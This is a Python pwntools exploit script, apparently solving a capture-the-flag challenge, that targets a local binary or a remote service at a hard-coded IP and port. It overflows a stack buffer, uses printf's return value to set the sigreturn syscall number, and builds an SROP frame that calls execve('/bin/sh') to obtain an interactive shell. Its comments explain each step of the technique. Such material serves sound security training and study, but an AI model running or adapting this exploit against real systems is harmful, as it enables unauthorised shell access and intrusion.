#!/usr/bin/env python3

from pwn import *

exe = ELF("./app")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("157.180.85.167", 50002)

    return r


def main():
    r = conn()
    syscall_ret = 0x40123F  # syscall; ret
    r.sendafter(b"Enter your name:", b"/bin/sh\x00".ljust(0x80, b"A"))
    # we will preform a SROP attack so want to set our rax to 15 which is the syscall number for the sigreturn 
    # but we don't have a gadget to set rax to 15 so we need to find something else to help us
    # if u looked at the binary u will see that the last function in use is the printf
    # and we know that printf return the number of bytes printed and store it in rax so we can use that to set rax to 15 by printing 15 bytes
    # We want printf("You entered: %s\n", buf) to return 15 so that rax==15
    #"You entered: %s\n" => 13 + len(string) + 1(\n)
    #enter one char -> b"A\x00"
    offset = 0x48
    padding = b"A\x00" + b"B" * (0x40 - 2)
    rbx = b"C" * 8

    frame = SigreturnFrame(arch="amd64")
    frame.rax = 59
    frame.rdi = exe.symbols["name"]  # "/bin/sh\x00"
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall_ret

    payload = flat(
        padding,
        rbx,
        p64(syscall_ret),
        bytes(frame),
    )
    r.sendafter(b"Enter your data:", payload)
    r.interactive()


if __name__ == "__main__":
    main()
